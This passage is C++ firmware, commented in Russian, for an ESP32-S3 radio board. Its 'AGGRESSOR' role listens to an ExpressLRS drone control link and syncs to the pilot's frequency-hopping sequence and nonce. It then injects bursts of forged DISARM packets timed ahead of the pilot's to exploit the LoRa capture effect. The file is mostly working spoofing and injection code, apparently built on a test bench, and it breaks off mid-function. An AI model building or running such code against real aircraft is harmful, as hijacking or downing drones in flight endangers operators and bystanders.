/**
 * @file main.cpp
 * @brief ELRS DISARM System v3.1 — FreeRTOS dual-core + ISR-driven RX
 *
 * Роли: PILOT, DRONE, AGGRESSOR, MONITOR
 * Железо: LilyGO T3-S3 (ESP32-S3 + LR1121)
 * Binding phrase: TEST11 | Домен: FCC915
 *
 * АРХИТЕКТУРА v3.1 (Шаг 2: ISR + Task Notifications):
 *  - radioTask (Core 1, prio 5): вся логика TX/RX, FHSS, nonce
 *  - loop()   (Core 0):         кнопка BOOT + updateOLED() 5 раз/сек
 *  - Обмен данными: FreeRTOS Queue (1 элемент) через xQueueOverwrite /
 *    xQueuePeek
 *  - RX (DRONE, AGGRESSOR): radio.startReceive() → DIO9 ISR →
 *    vTaskNotifyGiveFromISR → ulTaskNotifyTake(pdMS_TO_TICKS(15))
 *    Таймаут 15 мс = 1 пропущенный слот. Компенсация: +1 HOP/nonce.
 *  - TX: синхронный radio.transmit() (~1.7 мс) — оставлен без изменений.
 *  - Тайминги TX-слота: esp_timer_get_time() (мкс, int64_t)
 *  - Тайминги OLED/LED: millis() (мс, uint32_t) — допустимо
 *  - Ожидание TX-слота: гибрид vTaskDelay (> TX_BUSYWAIT_THRESHOLD_US) +
 *    NOP busy-wait
 */

#include <Arduino.h>
#include <SPI.h>

// FreeRTOS — входит в ESP-IDF, доступен в Arduino Framework для ESP32
#include "freertos/FreeRTOS.h"
#include "freertos/queue.h"
#include "freertos/task.h"

// Высокоточный таймер ESP32 (1 мкс разрешение)
#include "esp_timer.h"

#include "elrs_config.h"
#include "pins_config.h"

#include "FHSS.h"
#include "OTA.h"
#include "crc.h"

// ============================================================
// Глобальные переменные протокола (общие для всех ролей)
// ============================================================
uint8_t uid[6];
uint8_t fhssSequence[FHSS_CHANNELS];
uint16_t crcSeed;
Crc2Byte crcCalc;

// ============================================================
// Вспомогательная функция — печать FHSS таблицы
// ============================================================
void printFHSSTable() {
  Serial.println("--- FHSS Sequence (first 10) ---");
  for (uint8_t i = 0; i < 10; i++) {
    float freq = FHSSgetFreq(fhssSequence, i);
    Serial.printf("  [%2d] ch=%2d  %.1f MHz\n", i, fhssSequence[i], freq);
  }
  Serial.printf("  sync channel = %d\n", FHSSsyncChannel());
  Serial.printf("  sync freq    = %.1f MHz\n",
                FHSSgetFreq(fhssSequence, FHSS_RENDEZVOUS_IDX));
  Serial.println("--------------------------------");
}

// ====================================================================
// =========================  ROLE_PILOT  =============================
// ====================================================================
#ifdef ROLE_PILOT

#include <RadioLib.h>
#include <U8g2lib.h>
#include <Wire.h>

// ─────────────────────────────────────────────────────────────────────
// Аппаратура
// ─────────────────────────────────────────────────────────────────────
SPIClass radioSPI(HSPI);
LR1121 radio = new Module(RADIO_CS_PIN, RADIO_DIO9_PIN, RADIO_RST_PIN,
                          RADIO_BUSY_PIN, radioSPI);
U8G2_SSD1306_128X64_NONAME_F_HW_I2C oled(U8G2_R0, U8X8_PIN_NONE);

// ─────────────────────────────────────────────────────────────────────
// Структура для передачи данных на OLED через очередь FreeRTOS.
// radioTask пишет, loop() читает. Копируются только POD-данные.
// ─────────────────────────────────────────────────────────────────────
struct DisplayState_t {
  bool isArmed;
  uint8_t fhssIndex;
  uint32_t cycleCount;
  uint8_t nonce;
  float freq;
};
static QueueHandle_t displayQueue = nullptr;

// ─────────────────────────────────────────────────────────────────────
// Состояние пилота — доступ ТОЛЬКО из radioTask (Core 1).
// isArmed — volatile: atomic read на ESP32, пишется из Core 0 (loop).
// ─────────────────────────────────────────────────────────────────────
volatile bool isArmed = true;
static uint8_t fhssIndex = 0;
static uint8_t nonce = 0;
static uint32_t cycleCount = 0;

// Кнопка — только Core 0
static bool lastBtnState = HIGH;
static uint32_t btnDebounceMs = 0;

// ─────────────────────────────────────────────────────────────────────
// Антенный переключатель
// ─────────────────────────────────────────────────────────────────────
static void antSwitchTX() {
  digitalWrite(ANT_SW_TX, HIGH);
  digitalWrite(ANT_SW_RX, LOW);
}

static int16_t radioSetFreqByIndex(uint8_t idx) {
  return radio.setFrequency(FHSSgetFreq(fhssSequence, idx));
}

// ─────────────────────────────────────────────────────────────────────
// Формирование пакетов (логика НЕ изменена)
// ─────────────────────────────────────────────────────────────────────
static void buildRCPacket(OTA_Packet4_s *pkt) {
  memset(pkt, 0, sizeof(OTA_Packet4_s));
  pkt->type = PACKET_TYPE_RCDATA;
  pkt->crcHigh = ELRS_CRC_HIGH_INIT(nonce);
  OTA4_packChannels(&pkt->rc.ch, OTA4_usToCh(1500), OTA4_usToCh(1500),
                    OTA4_usToCh(1500), OTA4_usToCh(1500));
  pkt->rc.isArmed = isArmed ? 1 : 0;
  pkt->rc.switches = 0;
  uint8_t *raw = (uint8_t *)pkt;
  uint16_t crc = crcCalc.calc(raw, OTA4_CRC_CALC_LEN, crcSeed);
  pkt->crcHigh = (crc >> 8) & 0x3F;
  pkt->crcLow = crc & 0xFF;
}

static void buildSyncPacket(OTA_Packet4_s *pkt) {
  memset(pkt, 0, sizeof(OTA_Packet4_s));
  pkt->type = PACKET_TYPE_SYNC;
  pkt->crcHigh = ELRS_CRC_HIGH_INIT(nonce);
  pkt->sync.fhssIndex = fhssIndex;
  pkt->sync.nonce = nonce;
  pkt->sync.rfRateEnum = 1;
  pkt->sync.switchEncMode = 0;
  pkt->sync.newTlmRatio = 0;
  pkt->sync.geminiMode = 0;
  pkt->sync.otaProtocol = 0;
  pkt->sync.free = 0;
  pkt->sync.UID4 = uid[4];
  pkt->sync.UID5 = uid[5];
  uint8_t *raw = (uint8_t *)pkt;
  uint16_t crc = crcCalc.calc(raw, OTA4_CRC_CALC_LEN, crcSeed);
  pkt->crcHigh = (crc >> 8) & 0x3F;
  pkt->crcLow = crc & 0xFF;
}

static int16_t transmitPacket(OTA_Packet4_s *pkt) {
  antSwitchTX();
  int16_t state = radio.transmit((uint8_t *)pkt, OTA4_PACKET_SIZE);
  cycleCount++;
  return state;
}

// ─────────────────────────────────────────────────────────────────────
// OLED — вызывается из loop() (Core 0), читает из очереди.
// Используем millis() для 200 мс интервала — некритично по точности.
// ─────────────────────────────────────────────────────────────────────
static uint32_t lastOledUpdateMs = 0;

static void updateOLED() {
  uint32_t now = millis();
  if (now - lastOledUpdateMs < 200)
    return;
  lastOledUpdateMs = now;

  // Читаем снимок состояния из очереди без блокировки
  DisplayState_t ds = {};
  xQueuePeek(displayQueue, &ds, 0);

  oled.clearBuffer();
  char line[32];

  if (ds.isArmed) {
    oled.setDrawColor(1);
    oled.drawBox(0, 0, 128, 15);
    oled.setDrawColor(0);
    oled.setFont(u8g2_font_6x13B_tf);
    oled.drawStr(2, 12, "PILOT  [ARMED]");
    oled.setDrawColor(1);
    oled.setFont(u8g2_font_6x13_tf);
    snprintf(line, sizeof(line), "F: %.1f  idx=%d", ds.freq, ds.fhssIndex);
    oled.drawStr(0, 28, line);
    snprintf(line, sizeof(line), "TX: %u pkts", ds.cycleCount);
    oled.drawStr(0, 41, line);
    snprintf(line, sizeof(line), "nonce: %d", ds.nonce);
    oled.drawStr(0, 54, line);
    oled.setFont(u8g2_font_5x7_tf);
    oled.drawStr(0, 63, "BOOT=DISARM");
  } else {
    oled.setDrawColor(1);
    oled.drawBox(0, 0, 128, 64);
    oled.setDrawColor(0);
    oled.setFont(u8g2_font_6x13_tf);
    oled.drawStr(0, 13, "PILOT (TX)");
    oled.setFont(u8g2_font_6x13B_tf);
    oled.drawStr(0, 28, "[DISARMED]");
    oled.setFont(u8g2_font_6x13_tf);
    snprintf(line, sizeof(line), "F: %.1f  idx=%d", ds.freq, ds.fhssIndex);
    oled.drawStr(0, 41, line);
    snprintf(line, sizeof(line), "TX: %u pkts", ds.cycleCount);
    oled.drawStr(0, 54, line);
    oled.setFont(u8g2_font_5x7_tf);
    oled.drawStr(0, 63, "BOOT=ARM");
    oled.setDrawColor(1);
  }
  oled.sendBuffer();
}

// ─────────────────────────────────────────────────────────────────────
// radioTask — выполняется на Core 1 с приоритетом 5.
// Содержит полный TX-цикл 100 Hz: ожидание слота → TX → HOP → nonce++.
//
// Гибридное ожидание слота:
//   1) Если до слота > TX_BUSYWAIT_THRESHOLD_US (2 мс) → vTaskDelay
//      чтобы отдать ядро и не триггерить Watchdog Timer (WDT).
//   2) Последние мкс → жёсткий busy-wait с NOP для точного тайминга.
// ─────────────────────────────────────────────────────────────────────
static void radioTask(void *pvParameters) {
  // Инициализируем абсолютный таймер первого слота
  int64_t nextTxTimeUs = esp_timer_get_time();

  Serial.println("[radioTask] Started on Core 1");

  while (true) {
    // ==== ГИБРИДНОЕ ОЖИДАНИЕ TX-СЛОТА ====
    int64_t nowUs = esp_timer_get_time();
    int64_t diffUs = nextTxTimeUs - nowUs;

    if (diffUs > TX_BUSYWAIT_THRESHOLD_US) {
      // Спим через FreeRTOS, отдавая ядро планировщику.
      // Вычитаем 1 мс чтобы проснуться чуть раньше и не проскочить слот.
      vTaskDelay(pdMS_TO_TICKS((uint32_t)((diffUs / 1000LL) - 1)));
    }
    // Последние микросекунды — жёсткий busy-wait для точного тайминга
    while (esp_timer_get_time() < nextTxTimeUs) {
      __asm__ __volatile__("nop"); // Не даём компилятору выкинуть цикл
    }

    // Фиксируем следующий слот (абсолютный, без накопления ошибки)
    nextTxTimeUs += TX_INTERVAL_US;

    // ==== ВЫБОР ЧАСТОТЫ ====
    radioSetFreqByIndex(fhssIndex);

    // ==== TX: SYNC или RC пакет ====
    OTA_Packet4_s pkt;
    if (ELRS_SHOULD_SYNC(nonce)) {
      buildSyncPacket(&pkt);
    } else {
      buildRCPacket(&pkt);
    }
    transmitPacket(&pkt);

    // ==== FHSS HOP ====
    if (ELRS_SHOULD_HOP(nonce)) {
      fhssIndex = FHSSnextIndex(fhssIndex);
      // Редкое событие — логируем смену канала
      Serial.printf("[PILOT] HOP → idx=%d freq=%.1f\n", fhssIndex,
                    FHSSgetFreq(fhssSequence, fhssIndex));
    }

    nonce++;

    // ==== ОБНОВЛЕНИЕ ОЧЕРЕДИ ДИСПЛЕЯ (без блокировки) ====
    // xQueueOverwrite: перезаписывает единственный элемент в очереди.
    // radioTask НИКОГДА не блокируется на очереди.
    DisplayState_t ds;
    ds.isArmed = isArmed;
    ds.fhssIndex = fhssIndex;
    ds.cycleCount = cycleCount;
    ds.nonce = nonce;
    ds.freq = FHSSgetFreq(fhssSequence, fhssIndex);
    xQueueOverwrite(displayQueue, &ds);
  }
}

// ─────────────────────────────────────────────────────────────────────
// SETUP — ROLE_PILOT
// ─────────────────────────────────────────────────────────────────────
void setup() {
  Serial.begin(115200);
  delay(3000);

  Serial.println("\n========================================");
  Serial.println("  ELRS DISARM System v3.0");
  Serial.println("  Role: " DEVICE_ROLE);
  Serial.println("========================================");

  pinMode(ANT_SW_VDD, OUTPUT);
  pinMode(ANT_SW_TX, OUTPUT);
  pinMode(ANT_SW_RX, OUTPUT);
  pinMode(BOARD_LED, OUTPUT);
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  digitalWrite(ANT_SW_VDD, HIGH);
  digitalWrite(BOARD_LED, HIGH);
  antSwitchTX();

  // UID / CRC / FHSS
  Serial.printf("\n[BIND] Phrase: \"%s\"\n", BINDING_PHRASE);
  generateUID(BINDING_PHRASE, uid);
  Serial.printf("[BIND] UID: %02X:%02X:%02X:%02X:%02X:%02X\n", uid[0], uid[1],
                uid[2], uid[3], uid[4], uid[5]);
  crcSeed = ((uint16_t)uid[4] << 8) | uid[5];
  crcCalc.init(14, ELRS_CRC14_POLY);
  generateFHSSsequence(uid, fhssSequence);
  printFHSSTable();

  // SPI + LR1121
  radioSPI.begin(RADIO_SCLK_PIN, RADIO_MISO_PIN, RADIO_MOSI_PIN, RADIO_CS_PIN);
  int16_t state = radio.begin();
  if (state != RADIOLIB_ERR_NONE) {
    Serial.printf("[RADIO] FAIL begin()=%d\n", state);
    while (true)
      delay(1000);
  }
  radio.setFrequency(FHSSgetFreq(fhssSequence, 0));
  radio.setBandwidth(CONFIG_RADIO_BW);
  radio.setSpreadingFactor(CONFIG_RADIO_SF);
  radio.setCodingRate(CONFIG_RADIO_CR);
  radio.setSyncWord(CONFIG_RADIO_SYNC_WORD);
  radio.setPreambleLength(CONFIG_RADIO_PREAMBLE);
  radio.setOutputPower(CONFIG_RADIO_OUTPUT_POWER);
  Serial.println("[RADIO] LR1121 OK");

  // OLED
  Wire.begin(I2C_SDA, I2C_SCL);
  delay(100);
  if (!oled.begin()) {
    Serial.println("[OLED] FAIL");
  } else {
    oled.clearBuffer();
    oled.setFont(u8g2_font_6x13_tf);
    oled.drawStr(0, 30, "PILOT READY");
    oled.drawStr(0, 50, "ARMED");
    oled.sendBuffer();
    Serial.println("[OLED] OK");
  }

  // Создаём очередь на 1 элемент типа DisplayState_t
  displayQueue = xQueueCreate(1, sizeof(DisplayState_t));
  configASSERT(displayQueue != nullptr);

  // Запускаем radioTask на Core 1, приоритет 5, стек 4096 байт
  xTaskCreatePinnedToCore(radioTask,   // функция задачи
                          "radioTask", // имя (для отладки)
                          4096,        // стек в байтах
                          nullptr,     // параметры (не нужны)
                          5,           // приоритет (выше loop = 1)
                          nullptr,     // хендл задачи (не нужен)
                          1            // Core 1
  );

  Serial.println("  PILOT ready. radioTask running on Core 1.");
  Serial.println("========================================\n");
}

// ─────────────────────────────────────────────────────────────────────
// LOOP — ROLE_PILOT (Core 0)
// Только: антидребезг кнопки BOOT + обновление OLED 5 раз/сек.
// Вся радио-логика вынесена в radioTask (Core 1).
// ─────────────────────────────────────────────────────────────────────
void loop() {
  // Антидребезг кнопки BOOT — toggle ARM/DISARM
  bool btnNow = digitalRead(BUTTON_PIN);
  if (btnNow == LOW && lastBtnState == HIGH &&
      (millis() - btnDebounceMs > 250)) {
    isArmed = !isArmed; // volatile — атомарно на ESP32
    btnDebounceMs = millis();
    digitalWrite(BOARD_LED, isArmed ? HIGH : LOW);
    Serial.printf("[BTN] Pilot is now %s\n", isArmed ? "ARMED" : "DISARMED");
  }
  lastBtnState = btnNow;

  // Обновление OLED не чаще 5 раз/сек (200 мс)
  updateOLED();
}

#endif // ROLE_PILOT

// ====================================================================
// =====================  ROLE_AGGRESSOR  =============================
// ====================================================================
#ifdef ROLE_AGGRESSOR

#include <RadioLib.h>
#include <U8g2lib.h>
#include <Wire.h>

// ─────────────────────────────────────────────────────────────────────
// Аппаратура
// ─────────────────────────────────────────────────────────────────────
SPIClass radioSPI(HSPI);
LR1121 radio = new Module(RADIO_CS_PIN, RADIO_DIO9_PIN, RADIO_RST_PIN,
                          RADIO_BUSY_PIN, radioSPI);
U8G2_SSD1306_128X64_NONAME_F_HW_I2C oled(U8G2_R0, U8X8_PIN_NONE);

// ─────────────────────────────────────────────────────────────────────
// Структура для обмена с OLED через очередь
// ─────────────────────────────────────────────────────────────────────
struct DisplayState_t {
  bool attackEnabled;
  uint8_t aggrMode; // 0=AGG_SOLO, 1=AGG_SYNC
  uint8_t fhssIndex;
  float lastPilotRSSI;
  uint32_t rxPilotCount;
  uint32_t txCount;
};
static QueueHandle_t displayQueue = nullptr;

// ─────────────────────────────────────────────────────────────────────
// ISR — вызывается аппаратно по DIO9 при получении пакета.
// Уведомляет radioTask через FreeRTOS Task Notification.
// IRAM_ATTR: функция помещается в IRAM чтобы ISR работал
// даже при кэш-промахах Flash (критично на ESP32-S3).
// ─────────────────────────────────────────────────────────────────────
static TaskHandle_t radioTaskHandle = nullptr;

void IRAM_ATTR setRxFlagISR() {
  BaseType_t xHigherPriorityTaskWoken = pdFALSE;
  // Атомарно разбудить radioTask из ISR-контекста
  vTaskNotifyGiveFromISR(radioTaskHandle, &xHigherPriorityTaskWoken);
  // Если radioTask приоритетнее прерванной задачи — немедленный переключатель
  // контекста
  portYIELD_FROM_ISR(xHigherPriorityTaskWoken);
}

enum AggrMode { AGG_SYNC, AGG_SOLO };

// volatile — пишется из Core 0 (loop/handleButton), читается из Core 1
// (radioTask)
volatile bool attackEnabled = false;
static AggrMode aggrMode = AGG_SOLO;
static uint8_t fhssIndex = 0;
static uint8_t nonce = 0;
static float lastPilotRSSI = 0.0f;
static int64_t lastPilotUs = 0;  // время последнего приёма пилота (мкс)
static int64_t soloNextTxUs = 0; // таймер для SOLO режима (мкс)
static uint32_t cycleCount = 0;
static uint32_t txCount = 0;
static uint32_t rxPilotCount = 0;

// Кнопка — только Core 0
static bool lastBtnState = HIGH;
static uint32_t btnDebounceMs = 0;

// ─────────────────────────────────────────────────────────────────────
// Антенный переключатель
// ─────────────────────────────────────────────────────────────────────
static void antSwitchTX() {
  digitalWrite(ANT_SW_TX, HIGH);
  digitalWrite(ANT_SW_RX, LOW);
}
static void antSwitchRX() {
  digitalWrite(ANT_SW_TX, LOW);
  digitalWrite(ANT_SW_RX, HIGH);
}

static int16_t radioSetFreqByIndex(uint8_t idx) {
  return radio.setFrequency(FHSSgetFreq(fhssSequence, idx));
}

// ─────────────────────────────────────────────────────────────────────
// Формирование пакетов (логика НЕ изменена)
// ─────────────────────────────────────────────────────────────────────
static void buildDisarmPacket(OTA_Packet4_s *pkt) {
  memset(pkt, 0, sizeof(OTA_Packet4_s));
  pkt->type = PACKET_TYPE_RCDATA;
  pkt->crcHigh = ELRS_CRC_HIGH_INIT(nonce);
  OTA4_packChannels(&pkt->rc.ch, OTA4_usToCh(1500), OTA4_usToCh(1500),
                    OTA4_usToCh(1500), OTA4_usToCh(988));
  pkt->rc.isArmed = 0; // DISARM
  pkt->rc.switches = 0;
  uint8_t *raw = (uint8_t *)pkt;
  uint16_t crc = crcCalc.calc(raw, OTA4_CRC_CALC_LEN, crcSeed);
  pkt->crcHigh = (crc >> 8) & 0x3F;
  pkt->crcLow = crc & 0xFF;
}

static void buildSyncPacket(OTA_Packet4_s *pkt) {
  memset(pkt, 0, sizeof(OTA_Packet4_s));
  pkt->type = PACKET_TYPE_SYNC;
  pkt->crcHigh = ELRS_CRC_HIGH_INIT(nonce);
  pkt->sync.fhssIndex = fhssIndex;
  pkt->sync.nonce = nonce;
  pkt->sync.rfRateEnum = 1;
  pkt->sync.switchEncMode = 0;
  pkt->sync.newTlmRatio = 0;
  pkt->sync.geminiMode = 0;
  pkt->sync.otaProtocol = 0;
  pkt->sync.free = 0;
  pkt->sync.UID4 = uid[4];
  pkt->sync.UID5 = uid[5];
  uint8_t *raw = (uint8_t *)pkt;
  uint16_t crc = crcCalc.calc(raw, OTA4_CRC_CALC_LEN, crcSeed);
  pkt->crcHigh = (crc >> 8) & 0x3F;
  pkt->crcLow = crc & 0xFF;
}

static int16_t transmitPacket(OTA_Packet4_s *pkt) {
  antSwitchTX();
  int16_t state = radio.transmit((uint8_t *)pkt, OTA4_PACKET_SIZE);
  txCount++;
  antSwitchRX();
  return state;
}

static bool validateReceivedPacket(const OTA_Packet4_s *pkt) {
  uint8_t buf[OTA4_CRC_CALC_LEN];
  memcpy(buf, pkt, OTA4_CRC_CALC_LEN);
  uint16_t pktCRC = ((uint16_t)(pkt->crcHigh) << 8) | pkt->crcLow;
  for (uint8_t n = 0; n < ELRS_FHSS_HOP_INTERVAL; n++) {
    buf[0] = (pkt->type & 0x03) | (((n % ELRS_FHSS_HOP_INTERVAL) + 1) << 2);
    if (crcCalc.calc(buf, OTA4_CRC_CALC_LEN, crcSeed) == pktCRC)
      return true;
  }
  return false;
}

// ─────────────────────────────────────────────────────────────────────
// Вспомогательная: отправить снимок в очередь дисплея (без блокировки)
// ─────────────────────────────────────────────────────────────────────
static inline void pushDisplay() {
  DisplayState_t ds;
  ds.attackEnabled = attackEnabled;
  ds.aggrMode = (aggrMode == AGG_SYNC) ? 1 : 0;
  ds.fhssIndex = fhssIndex;
  ds.lastPilotRSSI = lastPilotRSSI;
  ds.rxPilotCount = rxPilotCount;
  ds.txCount = txCount;
  xQueueOverwrite(displayQueue, &ds);
}

// ─────────────────────────────────────────────────────────────────────
// Тайминги атаки:
//
//   PACKET_TOA_US — время пакета в воздухе (Time on Air).
//   DIO9 дёргается только после ПОЛНОГО приёма пакета, поэтому:
//     rxTimeUs = T_pilotTxStart + PACKET_TOA_US
//   Следовательно реальный T_pilotTxStart = rxTimeUs - PACKET_TOA_US.
//   Без этой поправки мы опаздывали на ~1.2 мс и врезались в уже
//   идущий следующий пакет Пилота → CRC FAIL у Дрона.
//
//   ATTACK_LEAD_US — упреждение (Capture Effect).
//   Мы стартуем TX на 500 мкс РАНЬШЕ Пилота, чтобы Дрон захватил
//   наш преамбул первым (LoRa Capture Effect: первый выигрывает).
// ─────────────────────────────────────────────────────────────────────
#define PACKET_TOA_US 1700LL // SF6 / BW500: Time on Air ≈ 1.7 мс
#define ATTACK_LEAD_US 500LL // Упреждение атаки

// ─────────────────────────────────────────────────────────────────────
// SYNC режим: Предиктивная Атака — КОВРОВАЯ БОМБАРДИРОВКА (5 выстрелов)
//
// Схема работы:
//   1. ФАЗА ПРОСЛУШКИ: antSwitchRX() + startReceive() на текущем fhssIndex
//      → ulTaskNotifyTake(15 мс) — спим, пока ISR не разбудит нас.
//   2. При успешном приёме — синхронизируем fhssIndex/nonce с Пилотом.
//   3. BURST-АТАКА: 5 итераций подряд:
//      a. Предсказываем nextIdx (с учётом HOP).
//      b. standby() + setFreq(nextIdx) — переключаемся заранее.
//      c. Ждём до (basePilotTxTime + step*INTERVAL - LEAD_US).
//      d. Стреляем DISARM с nonce+1. Инкрементируем nonce/fhssIndex.
//   4. Следующая итерация while: 1 прослушка для коррекции дрейфа.
//   Таймаут: пилот не слышен → потенциальный переход в AGG_SOLO.
// ─────────────────────────────────────────────────────────────────────
// ─────────────────────────────────────────────────────────────────────
// SYNC режим: Предиктивная Атака — КОВРОВАЯ БОМБАРДИРОВКА (5 выстрелов)
// ─────────────────────────────────────────────────────────────────────
// ─────────────────────────────────────────────────────────────────────
// SYNC режим: Предиктивная Атака — КОВРОВАЯ БОМБАРДИРОВКА (5 выстрелов)
// ─────────────────────────────────────────────────────────────────────
static void runSync() {
  antSwitchRX();
  radio.standby(); // Сбрасываем автомат LR1121
  radioSetFreqByIndex(fhssIndex);

  ulTaskNotifyTake(pdTRUE, 0); // Чистим старые прерывания

  int16_t rxState = radio.startReceive();
  if (rxState != RADIOLIB_ERR_NONE) {
    Serial.printf("[AGG/SYNC] startReceive err=%d\n", rxState);
  }

  uint32_t notified = ulTaskNotifyTake(pdTRUE, pdMS_TO_TICKS(15));

  if (notified > 0) {
    int64_t rxTimeUs = esp_timer_get_time();

    uint8_t rxBuf[OTA4_PACKET_SIZE];
    radio.readData(rxBuf, OTA4_PACKET_SIZE);
    OTA_Packet4_s *rxPkt = (OTA_Packet4_s *)rxBuf;

    if (validateReceivedPacket(rxPkt)) {
      lastPilotRSSI = radio.getRSSI();
      lastPilotUs = rxTimeUs;
      rxPilotCount++;
      aggrMode = AGG_SYNC;

      // Синхронизация
      if (rxPkt->type == PACKET_TYPE_SYNC) {
        fhssIndex = rxPkt->sync.fhssIndex;
        nonce = rxPkt->sync.nonce;
      }

      // ── БОЕВОЙ РЕЖИМ: КОВРОВАЯ БОМБАРДИРОВКА (BURST) ──
      // Высчитываем истинное начало текущего пакета Пилота
      int64_t basePilotTxTime = rxTimeUs - PACKET_TOA_US;

      // Даем очередь из 5 пакетов подряд!
      for (int step = 0; step < 5; step++) {
        uint8_t nextIdx;
        if (ELRS_SHOULD_HOP(nonce)) {
          nextIdx = FHSSnextIndex(fhssIndex);
        } else {
          nextIdx = fhssIndex;
        }

        // Переключаемся на следующий канал заранее
        radio.standby();
        radioSetFreqByIndex(nextIdx);

        // Сдвигаем окно Пилота на 1 слот вперед
        basePilotTxTime += TX_INTERVAL_US;

        // Время нашей атаки (на 500 мкс раньше)
        int64_t attackTimeUs = basePilotTxTime - ATTACK_LEAD_US;

        // ЖЕСТКИЙ BUSY-WAIT (БЕЗ vTaskDelay!)
        // Это гарантирует микросекундную точность. За 50 мс WDT не упадет.
        while (esp_timer_get_time() < attackTimeUs) {
          __asm__ __volatile__("nop");
        }

        // Сборка пакета с правильным nonce для будущего слота
        OTA_Packet4_s txPkt;
        uint8_t attackNonce = nonce + 1;
        memset(&txPkt, 0, sizeof(OTA_Packet4_s));
        txPkt.type = PACKET_TYPE_RCDATA;
        txPkt.crcHigh = ELRS_CRC_HIGH_INIT(attackNonce);
        OTA4_packChannels(&txPkt.rc.ch, OTA4_usToCh(1500), OTA4_usToCh(1500),
                          OTA4_usToCh(1500), OTA4_usToCh(988)); // DISARM
        txPkt.rc.isArmed = 0;
        txPkt.rc.switches = 0;
        uint16_t crc = crcCalc.calc((uint8_t *)&txPkt, OTA4_CRC_CALC_LEN, crcSeed);
        txPkt.crcHigh = (crc >> 8) & 0x3F;
        txPkt.crcLow = crc & 0xFF;

        // ОГОНЬ!
        transmitPacket(&txPkt);

        // Синхронно шагаем по таблице
        nonce++;
        fhssIndex = nextIdx;
      }
      // Цикл на 5 выстрелов завершен. В следующей итерации while 
      // Агрессор 1 раз послушает эфир, чтобы убрать дрейф времени.

    } else {
      if (ELRS_SHOULD_HOP(nonce)) fhssIndex = FHSSnextIndex(fhssIndex);
      nonce++;
    }

  } else {
    // Таймаут
    if (esp_timer_get_time() - lastPilotUs > SYNC_TIMEOUT_US) {
      if (aggrMode == AGG_SYNC) {
        Serial.println("[AGG/SYNC] Pilot lost -> SOLO");
        aggrMode = AGG_SOLO;
        fhssIndex = 0;
      }
    }
    if (ELRS_SHOULD_HOP(nonce)) fhssIndex = FHSSnextIndex(fhssIndex);
    nonce++;
  }

  pushDisplay();
}
// ─────────────────────────────────────────────────────────────────────
// SOLO режим: шлём DISARM каждые TX_INTERVAL_US
//
// ВАЖНО: ранее здесь был `if (nowUs < soloNextTxUs) return;` —
// это создавало tight loop (миллионы итераций/сек на Core 1),
// отжирал 100% CPU и через несколько секунд срабатывал WDT panic.
// Заменено гибридным ожиданием, идентичным radioTask Пилота:
//   1) vTaskDelay — отдаём ядро планировщику, пока до слота > 2 мс.
//   2) NOP busy-wait — последние мкс для точного тайминга.
// ─────────────────────────────────────────────────────────────────────
static void runSolo() {
  // ── Гибридное ожидание TX-слота ───────────────────────────────────
  {
    int64_t nowUs = esp_timer_get_time();
    int64_t diffUs = soloNextTxUs - nowUs;
    if (diffUs > 0) {
      if (diffUs > TX_BUSYWAIT_THRESHOLD_US) {
        // Спим N-1 мс — просыпаемся чуть раньше слота.
        vTaskDelay(pdMS_TO_TICKS((uint32_t)((diffUs / 1000LL) - 1)));
      }
      while (esp_timer_get_time() < soloNextTxUs) {
        __asm__ __volatile__("nop");
      }
    }
  }
  // Обновляем абсолютный таймер следующего слота (без накопления ошибки).
  soloNextTxUs = esp_timer_get_time() + TX_INTERVAL_US;

  // FIX: Standby перед setFrequency.
  // В конце предыдущей итерации runSolo() чип остался в RX (startReceive).
  // Без Standby вызов setFrequency зависает на BUSY → блокировка ядра.
  radio.standby();
  radioSetFreqByIndex(fhssIndex);

  OTA_Packet4_s txPkt;
  if (ELRS_SHOULD_SYNC(nonce)) {
    buildSyncPacket(&txPkt);
    int16_t state = transmitPacket(&txPkt);
    Serial.printf("[SOLO] SYNC idx=%d nonce=%d state=%d\n", fhssIndex, nonce,
                  state);
  } else {
    buildDisarmPacket(&txPkt);
    transmitPacket(&txPkt);
    if (cycleCount % 50 == 0) {
      Serial.printf("[SOLO] DISARM idx=%d nonce=%d\n", fhssIndex, nonce);
    }
  }

  if (ELRS_SHOULD_HOP(nonce))
    fhssIndex = FHSSnextIndex(fhssIndex);
  nonce++;
  cycleCount++;

  // Быстрая проба приёма через ISR. Если пилот уже в эфире —
  // поймаем его за 3 мс (ToA SF6/BW500 ≈ 1.7 мс).
  antSwitchRX();
  // FIX: Очищаем pending-нотификации от TX-фазы перед startReceive().
  ulTaskNotifyTake(pdTRUE, 0);
  int16_t probeState = radio.startReceive();
  if (probeState != RADIOLIB_ERR_NONE) {
    Serial.printf("[SOLO probe] startReceive err=%d\n", probeState);
  }
  // Таймаут 3 мс — минимально достаточно для одного пакета
  uint32_t probeNotified = ulTaskNotifyTake(pdTRUE, pdMS_TO_TICKS(3));
  if (probeNotified > 0) {
    uint8_t probe[OTA4_PACKET_SIZE];
    radio.readData(probe, OTA4_PACKET_SIZE);
    OTA_Packet4_s *rxPkt = (OTA_Packet4_s *)probe;
    if (validateReceivedPacket(rxPkt)) {
      lastPilotRSSI = radio.getRSSI();
      lastPilotUs = esp_timer_get_time();
      rxPilotCount++;
      aggrMode = AGG_SYNC;
      if (rxPkt->type == PACKET_TYPE_SYNC) {
        fhssIndex = rxPkt->sync.fhssIndex;
        nonce = rxPkt->sync.nonce;
      }
      Serial.printf("[SOLO→SYNC] Pilot! RSSI=%.0f\n", lastPilotRSSI);
    }
  }
  pushDisplay();
}

// ─────────────────────────────────────────────────────────────────────
// radioTask — Core 1, приоритет 5
// ─────────────────────────────────────────────────────────────────────
static void radioTask(void *pvParameters) {
  soloNextTxUs = esp_timer_get_time();
  Serial.println("[radioTask] AGGRESSOR started on Core 1");

  // FIX: Флаг предыдущего состояния attackEnabled.
  // Позволяет переинициализировать soloNextTxUs в момент ПЕРВОГО включения
  // атаки, а не при загрузке прошивки. Без этого, если атаку включить
  // через N секунд после старта, soloNextTxUs окажется в далёком прошлом
  // и таймер сойдёт с ума — diffUs будет огромным отрицательным.
  static bool wasEnabled = false;

  while (true) {
    if (!attackEnabled) {
      // Атака выключена — спим, не грузим ядро.
      // FIX: Сбрасываем флаг, чтобы при следующем включении
      // soloNextTxUs пересчитался от текущего момента.
      if (wasEnabled) {
        wasEnabled = false;
      }
      vTaskDelay(pdMS_TO_TICKS(50));
      pushDisplay();
      continue;
    }

    // FIX: Первое включение атаки — пересчитываем точку старта таймера.
    // Это гарантирует, что runSolo() не получит гигантский отрицательный diffUs
    // и не провалится в NOP busy-wait навсегда.
